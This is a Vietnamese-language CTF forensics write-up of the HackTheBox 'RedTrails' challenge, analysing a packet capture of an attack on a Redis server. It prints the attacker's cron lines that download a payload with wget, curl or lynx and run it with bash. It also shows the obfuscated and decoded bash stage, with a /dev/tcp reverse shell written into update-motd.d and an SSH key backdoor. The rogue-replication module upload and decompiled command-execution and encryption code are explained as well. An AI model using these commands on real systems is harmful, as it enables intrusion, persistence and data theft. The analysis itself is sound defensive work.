<img width="1640" height="880" alt="image" src="https://github.com/user-attachments/assets/bfa83bcc-bd85-45cd-a6ed-f4fb285c3ea0" />

# RedTrails 

Scenario: Our SOC team detected a suspicious activity on one of our redis instance. Despite the fact it was password protected it seems that the attacker still obtained access to it. We need to put in place a remediation strategy as soon as possible, to do that it's necessary to gather more informations about the attack used. NOTE: flag is composed by three parts.

### Skill: 

Wireshark tools to read packet, stream, thread of the attack 

Basic reverse dll - pe executable file

Deobfuscated 

Knowledge Infra Structure of Redis Protocol and vullnerable exploited


### Writeup 

Đầu tiên artifact mà mình có được duy nhất là 1 file `capture.pcap`, với packet total khá nhỏ, chỉ khoảng 161 packet, mình thực hiện kiểm tra theo từng luồng, đầu tiên là đọc xem `tcp.stream eq 0` thì sẽ xảy ra các hành vi gì:

<img width="1901" height="614" alt="image" src="https://github.com/user-attachments/assets/c9f3e73e-1ae6-468c-a757-310ddfa4dcab" />

ở đây mình nắm được 1 vài info chính của context này bao gồm:
- ip victim là: 10.10.0.90
- ip của attacker đầu tiên thực hiện connect tới server sẽ là 10.10.0.15
- Attacker bằng một kỹ thuật nào đó đã có được auth của server và đang thực hiện xác thực (authentication)
- Đồng thời attacker còn có khả năng thực thi command trên server

Các command mà attacker đã thực thi trên server bao gồm:
- DOCS: liệt kê ra một danh sách command có thể thực thi trên server
- INFO: Có được 1 số thông tin cơ bản của server, client, infra, persistence, cpu, memory hiện tại.
- KEY: -> ở đây mình thấy chỉ trỏ về user-table -> user-table: thì chứa toàn bộ hash của username:password của các user hiện tại trong server, có thể KEYS ở đây chính là credentials của các user trong hệ thống
Tiếp theo là một chuỗi lệnh được attacker sử dụng để tạo persistence bằng `cron - Là một service features khá giống với scheduletask bên windows` thực hiện tạo ra 3 cron dbfilename để thực thi lệnh tải xuống payload persistence:
```
TY1RI8 -> wget -O VgLy8V0Zxo 'http://files.pypi-install.com/packages/VgLy8V0Zxo' && bash VgLy8V0Zxo
EJHIPI -> curl -s -k 'http://files.pypi-install.com/packages/VgLy8V0Zxo' > VgLy8V0Zxo && bash VgLy8V0Zxo
MBW89Y -> lynx -source 'http://files.pypi-install.com/packages/VgLy8V0Zxo' > VgLy8V0Zxo && bash VgLy8V0Zxo
```

> Tất cả các cron service trên đều thực hiện cùng 1 hành động là thực hiện download payload `VgLy8V0Zxo` và thực hiện executable bằng `bash`

Tổng quan stream 0 thực hiện authentication tới server, thực hiện gom hash user, download payload và executable -> và mình cũng có được part2 của flag: `FLAG_PART:_c0uld_0p3n_n3w`

Tiếp theo đến `tcp.stream eq 1` victim bắt đầu tải xuống payload và mình có thể lấy được toàn bộ cục payload đã được obfuscated:

```bash
gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==gCHFjNyEDT5AnZFJmR4wEaKoQfKIDRJRmNUJWd2JGMHt0N4lgC2tmZGFkYpd1a1hlVKhGbJowegkCKHFjNyEDT5AnZFJmR4wEaKoQfKg2chJGI8BSZk92YlRWLtACN2U2chJGI8BiIwFDeJBFJUxkSwNEJOB1TxZEJzdWQwhGJjtUOEZGJBZjaKhEJuFmSZdEJwV3N5EHJrhkerJGJpdjUWdGJXJWZRxEJiAyboNWZJogI90zdjJSPwFDeJBVCKISNWJTYmJ1VaZDbtNmdodEZxYkMM9mTzMWd4kmZnRjaQdWST5keN1mYwMGVOVnR6hVMFRkW6l0MlNkUGNVOwoHZppESkpEcFVGNnZUTpZFSjJVNrVmRWV0YLZleiJkUwk1cGR1TyMXbNJSPUxkSwNUCKIydJJTVMR2VRlmWERGe5MkYXp1RNNjTVVWSWxmWPhGRNJkRVFlUSd0UaZVRTlnVtJVeBRUYNxWbONzaXdVeKh0UwQmRSNkQ61EWG5WT4pVbNRTOtp1VGpXTGlDMihUNFVWaGpWTH5UblJSPOB1TxZUCKICcoZ1YDRGMZdkRuRmdChlVzg3ViJTUyMlW1U0U1gzQT5EaYNlVW5GV2pUbT9Ebt1URGBDVwZ0RlRFeXNlcFd1TZxmbRpXUuJ2c5cFZaRmaXZXVEpFdWZVYqlDMOJnVrVWWoVEZ6VkeTJSPzdWQwhWCKIyMzJjTaxmbVVDMVF2dvFTVuFDMR9GbxoVeRdEZhBXbORDdp5kQ01WVxYFVhRHewola0tmTpJFWjFjWupFUxs2UxplVX1GcFVGboZFZ4BTbZBFbEpFc4JzUyRTbSl3YFVWMFV1UHZ0MSJSPjtUOEZWCKIicSJzY6RmVjNFd5F1QShFV2NXRVBnTUZVU1ckUCRWRPpFaxIlcG1mT0IkbWxkVu5EUsZEVy5EWOxkWwYVMZdkY5ZVVTxEbwQ2MnVUTR5EMLZXWVV2MWJTYvxWMMZXTsNlNS5WUNRGWVJSPBZjaKhUCKIySSZVWhplVXVTTUVGckd0V0x2VWtWMHVWSWx2Y2AnMkd3YFZFUkd0TZZ0aR9mVW50dWtWUyhmbkdXSGVWe4IjTQpkaOplTIFmWSVkTDZEVl9kRsJldRVFVNp1VTJXRX9UWs5WU6FlbiJSPuFmSZdUCKIyc5cFZaRmaXZXVEpFdWZVYqlDMOJnVrVWWoVEZ6VkeTNzcy4kWs5WV1ATVhd3bxUlbxATUvxWMalXUHRWYw1mT0QXaOJEdtV1cs5WUzh3aNlXUsZVRkh0VIRnMiJUOyM1U0dkTsR2ajJSPwV3N5EXCKICSoR0Y3dGSVhUOrFVSWREVoJERllnUXJlS0tWV3hzVOZkS6xkdzdUTMZkMTpnRyQFMkV0T6lTRaNFczoFTGFjYyk0RWpkStZVeZtWW3FEShBzZq1UWSpHTyVERVVnUGVWbOd1UNZkbiJSPrhkerJWCKIiM1UlV5plbUh3bx4kbkdkV0ZlbSZDaHdVU502YZR3aWBTMXJle1UEZIRHMMJzYtNVNFhVZ6BnVjJkWtJmdOhUThZFWRJjWtFVNwtmVpBHMNlmTFJGb0lWUsZFbZlmVU1USoh0VXBXMNJSPpdjUWdWCKICTWVFZaVTbOpWNrdVdCFzS4BHbNRjRwEGaxAzUVZlVPhHdtZFNNVVVC5UVRJkRrFlQGZVUFZUVRJkRVJVeNdVZ41UVZZTNw00QGVVUCZURJhmTuNGdnJzY6VzRYlWQTpFdBlnYv50VaJSPXJWZRxUCKsHIpgiMElEZ2QlY1ZnYwc0S3gnCK0nCoNXYiBCfgUGZvNWZk1SLgQjNlNXYiBCfgICW4lUUnRCSqB1TRRieuZnQBRiIg8GajVGIgACIKcySJhlWrZ0Va9WMD10d4MkW1F1RkZXMXxEbShVWrJEWkZXTHRGbn0DW4lUUnlgCnkzQJtSQ5pUaFpmSrEERJNTT61Ee4MUT3lkaMdHND1Ee0MUT4hzQjp2J9gkaQ9UUJowJSNDTyY1RaZXQpp0KBNVY0F0QhpnRtlVaBlXW0F0QhpnRtllbBlnYv50VadSP65mdCFUCKsHIpgidrZmRBJWaXtWdYZlSoxmCKg2chJ2LulmYvEyI
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
```

Ở đây mình sử dụng một tools trên github là debash: [debash](https://github.com/iyarivky/debash) để thực hiện deobfuscated bash script ở trên, và output mình sẽ có được:

```
echo" '==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| rev |base64 -d
```

Ở đây mình sẽ có 1 script bash tiếp tục bị obfuscated sau:

```
#!/bin/bash

lhJVXukWibAFfkv() {
	ABvnz='ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3R'
	QOPjH='jcC8xMC4xMC4wLjIwMC8xMzM3IDA+JjEiJyA+IC9'
	gQIxX='ldGMvdXBkYXRlLW1vdGQuZC8wMC1oZWFkZXIK'
    echo "$ABvnz$QOPjH$gQIxX" | base64 --decode | bash
}

x7KG0bvubT6dID2() {
	LQebW="ZWNobyAtZSAiXG5zc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUNBUUM4VmtxOVVUS01ha0F4MlpxK1BuWk5jNm5ZdUVL"
	gVR7i="M1pWWHhIMTViYlVlQitlbENiM0piVkp5QmZ2QXVaMHNvbmZBcVpzeXE5Smc2L0tHdE5zRW10VktYcm9QWGh6RnVtVGdnN1oxTnZyVU52"
	bkzHk="bnFMSWNmeFRuUDErLzRYMjg0aHAwYkYyVmJJVGI2b1FLZ3pSZE9zOEd0T2FzS2FLMGsvLzJFNW8wUktJRWRyeDBhTDVIQk9HUHgwcDhH"
	q97up="ckdlNGtSS29Bb2tHWHdEVlQyMkxsQnlsUmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3SzEzdEhYekVrN09jaVVtZDUvWjdZdW9s"
	GYJan="bnQzQnlYOWErSWZMTUQvRlFOeTFCNERZaHNZNjJPN28yeFIwdnhrQkVwNVVoQkFYOGdPVEcwd2p6clVIeG1kVWltWGdpeTM5WVZaYVRK"
	HJj6A="UXdMQnR6SlMvL1loa2V3eUYvK0NQMEg3d0lLSUVybGY1V0ZLNXNrTFlPNnVLVnB4NmFrR1hZOEdBRG5QVTNpUEsvTXRCQytScVdzc2Rr"
	fD9Kc="R3FGSUE1eEcyRm4rS2xpZDlPYm0xdVhleEpmWVZqSk1PZnZ1cXRiNktjZ0xtaTV1UmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3"
	hpAgs="SzEzdEhYekVrN09jaVVtZDUvWjdZdW9sbnQzQnlYOWErSWxTeGFpT0FEMmlOSmJvTnVVSXhNSC85SE5ZS2Q2bWx3VXBvdnFGY0dCcVhp"
	FqOPN="emNGMjFieE5Hb09FMzFWZm94MmZxMnFXMzBCRFd0SHJyWWk3NmlMaDAyRmVySEVZSGRRQUFBMDhOZlVIeUN3MGZWbC9xdDZiQWdLU2Iw"
	CpJLT="Mms2OTFsY0RBbzVKcEVFek5RcHViMFg4eEpJdHJidz09SFRCe3IzZDE1XzFuNTc0bmMzNSIgPj4gfi8uc3NoL2F1dGhvcml6ZWRfa2V5"
	PIx1p="cw=="
	echo "$LQebW$gVR7i$bkzHk$q97up$GYJan$HJj6A$fD9Kc$hpAgs$FqOPN$CpJLT$PIx1p" | base64 --decode | bash
}

hL8FbEfp9L1261G() {
	lhJVXukWibAFfkv
	x7KG0bvubT6dID2
}

hL8FbEfp9L1261G
```
Tới đây logic của bash này sẽ thực hiện 2 hành vi khác nhau dựa vào 2 func `lhJVXukWibAFfkv()` và `x7KG0bvubT6dID2()` với hành vi chi tiết là:
- Function `lhJVXukWibAFfkv()` thực hiện hành vi persistence bằng folder `update-motd.d` - đây là một folder sẽ thực hiện chạy các lệnh một cách automate với cơ chế (Message Of the Day) chạy mỗi khi user thực hiện đăng nhập vào linux bằng terminal or ssh, đồng thời với cơ chế chạy theo số thứ tự và bảng chữ cái, attacker thực hiện đặt tên với `00` ở đầu sẽ default làm cho script này chạy đầu tiên khi user đăng nhập. Đây là 1 command reverse shell đến ip:port - `10.10.0.200:1337`
-> `echo 'bash -c "bash -i >& /dev/tcp/10.10.0.200/1337 0>&1"' > /etc/update-motd.d/00-header`

- Function `x7KG0bvubT6dID2()` thì thực hiện hành vi tạo backdoor bằng ssh key kèm với part1: **HTB{r3d15_1n574nc35**
-> `echo -e "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC8Vkq9UTKMakAx2Zq+PnZNc6nYuEK3ZVXxH15bbUeB+elCb3JbVJyBfvAuZ0sonfAqZsyq9Jg6/KGtNsEmtVKXroPXhzFumTgg7Z1NvrUNvnqLIcfxTnP1+/4X284hp0bF2VbITb6oQKgzRdOs8GtOasKaK0k//2E5o0RKIEdrx0aL5HBOGPx0p8GrGe4kRKoAokGXwDVT22LlBylRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IfLMD/FQNy1B4DYhsY62O7o2xR0vxkBEp5UhBAX8gOTG0wjzrUHxmdUimXgiy39YVZaTJQwLBtzJS//YhkewyF/+CP0H7wIKIErlf5WFK5skLYO6uKVpx6akGXY8GADnPU3iPK/MtBC+RqWssdkGqFIA5xG2Fn+Klid9Obm1uXexJfYVjJMOfvuqtb6KcgLmi5uRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IlSxaiOAD2iNJboNuUIxMH/9HNYKd6mlwUpovqFcGBqXizcF21bxNGoOE31Vfox2fq2qW30BDWtHrrYi76iLh02FerHEYHdQAAA08NfUHyCw0fVl/qt6bAgKSb02k691lcDAo5JpEEzNQpub0X8xJItrbw==HTB{r3d15_1n574nc35" >> ~/.ssh/authorized_keys`

Đây là tổng toàn bộ của hành vi của tcp stream 1, thực hiện các hành vi chính là download về file payload -> payload với các hành vi tạo persistence - backdoor.

Tiếp theo khi mình thực hiện xem luồng `tcp stream eq 2` thì mình thấy có một điểm khá bất thường khi mà ở đây:

<img width="1913" height="604" alt="Screenshot 2026-08-10 205338" src="https://github.com/user-attachments/assets/1fcc9863-5df8-4f2f-a782-cd9bd5e897b9" />

Bên trong stream 2 này chúng ta thấy hành động attacker thực hiện là load vào một 1 module malicious tên là `x10SPFHN.so` nhưng khi nhìn trong toàn bộ luồng trao đổi của packet thì mình k thấy bất cứ packet nào chứa content payload của file module này, và sau khi mình thực hiện tìm kiếm tiếp trong các luồng 3,4,5,6 thì mình phát hiện được, ở `tcp.stream eq 6` mình thấy trong luồng này attacker đã transfer một file module vào server của victim bằng giao thức RESD, ở đây mình sẽ nói kĩ một chút về lỗ hổng này mà attacker đã khai thác để có thể upload 1 file module malicious vào server:
- Đầu tiên thì ở stream 6, attacker bắt đầu setup một session yêu cầu server listen trên port `6379`
- Sau đó attacker gửi command `replconf capa eof capa psync2` -> ở đây command này là lệnh của giao thức nội bộ **redis**, lúc này attacker đang yêu cầu chuyển sang mode transfer dữ liệu trực tiếp qua mạng mà k lưu vào disk, mình research 1 chút chỗ này gọi là **Diskless**
-  Attacker tiếp tục gửi `PSYNC 86d03325daa4b4813f5f1ef94c0bc4839cf664b5 40` để yêu cầu đồng bộ 1 phần dữ liệu, nhưng server trả về `+FULLRESYNC ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ 1` tức là từ chối đồng bộ, và yêu cầu attacker có quyền thực hiện truyền 1 file thông qua môi trường mạng và thực thi không tạo file trên disk. Đây là cơ chế đồng bộ của Redis đã bị khai thác, cho phép gửi payload trực tiếp qua môi trường mạng mà k tạo file và k giới hạn lenght do cơ chế đồng bộ thất bại.
-  Lúc này attacker thực hiện Transfer module malicious vào server

Và toàn bộ timeline thời gian khi mình thực hiện gộp 2 luồng lại với nhau xem thử thì nó khá trùng khớp:

<img width="1919" height="783" alt="image" src="https://github.com/user-attachments/assets/c590420c-7a4c-401a-9a4d-f39dcf12e490" />

Đây là khoảng thời gian mà attacker bắt đầu tạo một tcp handshake mới tới server và bắt đầu yêu cầu thực hiện auth, set dbfilename `x10SPFHN.so`, tạo listen port 6379 đều khớp hoàn toàn

<img width="1870" height="560" alt="Screenshot 2026-08-10 212802" src="https://github.com/user-attachments/assets/a6467829-9d74-40a6-9405-78608f2ef1c1" />

Tiếp theo là timeline thực hiện transfer file qua môi trường mạng -> load module malicious -> chạy system.exec với lệnh rm module để xóa dấu vết -> unload module khỏi server.

Đây là toàn bộ hành động mà attacker đã hành động để thực hiện download module malicous -> load -> Exfil and encrypt data -> send to C2 server toàn bộ logic này nằm ở phần logic của module được load, mình cần thực hiện lấy file module malicious này ra và check hash thử để xem compiler và có các behavior gì:

-> Command lấy file module: 
```
┌──(nhduydeptrai㉿tobi)-[/mnt/…/CTF/HACK_THE_BOX/Challenge/Redtrails]
└─$ tshark -r capture.pcap -Y "(tcp.stream eq 6 && ip.src == 10.10.0.15) && (resp.bulk_string.value)" -T fields -e "resp.bulk_string.value" | xxd -r -p -> x10SPFHN.so
```

Sau đó upload lên virustotal:

<img width="1791" height="361" alt="image" src="https://github.com/user-attachments/assets/cc0deff8-eb8d-4153-a7f3-53a7ad77c584" />

- Được compiler bằng gcc - C
- Đúng signature byte ELF executable

Tới đây thực hiện reverse bằng ida pro hàm đảm nhiệm quá trình mã hóa và rce:

<details>
	<summary>
		Source func rce_&_encrypt
	</summary>

```C++
// bad sp value at call has been detected, the output may be wrong!
__int64 __fastcall DoCommand(__int64 a1, __int64 a2, int a3)
{
  size_t v3; // rbx
  size_t v4; // rax
  __int64 v5; // rax
  unsigned int v6; // eax
  int v7; // eax
  unsigned __int64 v8; // rax
  void *v9; // rsp
  __int64 (__fastcall *v10)(__int64, char *, size_t); // rbx
  size_t v11; // rax
  _QWORD v13[3]; // [rsp+8h] [rbp-1100h] BYREF
  int v14; // [rsp+24h] [rbp-10E4h]
  __int64 v15; // [rsp+28h] [rbp-10E0h]
  __int64 v16; // [rsp+30h] [rbp-10D8h]
  int v17; // [rsp+38h] [rbp-10D0h] BYREF
  int v18; // [rsp+3Ch] [rbp-10CCh]
  int v19; // [rsp+40h] [rbp-10C8h]
  int v20; // [rsp+44h] [rbp-10C4h]
  _BYTE v21[8]; // [rsp+48h] [rbp-10C0h] BYREF
  size_t size; // [rsp+50h] [rbp-10B8h]
  char *dest; // [rsp+58h] [rbp-10B0h]
  char *command; // [rsp+60h] [rbp-10A8h]
  FILE *stream; // [rsp+68h] [rbp-10A0h]
  char *s; // [rsp+70h] [rbp-1098h]
  char *src; // [rsp+78h] [rbp-1090h]
  char *v28; // [rsp+80h] [rbp-1088h]
  __int64 v29; // [rsp+88h] [rbp-1080h]
  __int64 v30; // [rsp+90h] [rbp-1078h]
  char *v31; // [rsp+98h] [rbp-1070h]
  __int64 v32; // [rsp+A0h] [rbp-1068h]
  char v33[16]; // [rsp+A8h] [rbp-1060h] BYREF
  char v34[32]; // [rsp+B8h] [rbp-1050h] BYREF
  _BYTE v35[16]; // [rsp+D8h] [rbp-1030h] BYREF
  unsigned __int64 v36; // [rsp+10E0h] [rbp-28h]

  v16 = a1;
  v15 = a2;
  v14 = a3;
  v36 = __readfsqword(0x28u);
  if ( a3 != 2 )
    return RedisModule_WrongArity(v16);
  size = 4096;
  command = (char *)RedisModule_StringPtrLen(*(_QWORD *)(v15 + 8), v21);
  stream = popen(command, "r");
  s = (char *)malloc(size);
  dest = (char *)malloc(size);
  while ( fgets(s, 8, stream) )
  {
    v3 = strlen(s);
    v4 = strlen(dest);
    if ( size <= v3 + v4 )
    {
      dest = (char *)realloc(dest, 4 * size);
      size *= 2LL;
    }
    strcat(dest, s);
  }
  src = "h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz";
  v28 = "YDP7ECjzuV7sagMN";
  strncpy(v34, "h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz", 0x20u);
  strncpy(v33, v28, 0x10u);
  v29 = EVP_CIPHER_CTX_new();
  v5 = EVP_aes_256_cbc();
  EVP_EncryptInit_ex(v29, v5, 0, v34, v33);
  v6 = strlen(dest);
  EVP_EncryptUpdate(v29, v35, &v17, dest, v6);
  v20 = v17;
  EVP_EncryptFinal_ex(v29, &v35[v17], &v17);
  v20 += v17;
  EVP_CIPHER_CTX_free(v29);
  v7 = 2 * v20 + 1;
  v30 = v7 - 1LL;
  v13[0] = v7;
  v13[1] = 0;
  v8 = 16 * ((v7 + 15LL) / 0x10uLL);
  while ( v13 != (_QWORD *)((char *)v13 - (v8 & 0xFFFFFFFFFFFFF000LL)) )
    ;
  v9 = alloca(v8 & 0xFFF);
  if ( (v8 & 0xFFF) != 0 )
    *(_QWORD *)((char *)&v13[-1] + (v8 & 0xFFF)) = *(_QWORD *)((char *)&v13[-1] + (v8 & 0xFFF));
  v31 = (char *)v13;
  v18 = 0;
  v19 = 0;
  while ( v18 < v20 )
  {
    snprintf(&v31[v19], 3u, "%02x", (unsigned __int8)v35[v18++]);
    v19 += 2;
  }
  v31[2 * v20] = 0;
  hexStringToBytes(v31, v35);
  v20 = strlen(v31) >> 1;
  v10 = (__int64 (__fastcall *)(__int64, char *, size_t))RedisModule_CreateString;
  v11 = strlen(v31);
  v32 = v10(v16, v31, v11);
  RedisModule_ReplyWithString(v16, v32);
  pclose(stream);
  return 0;
}
```
</details>

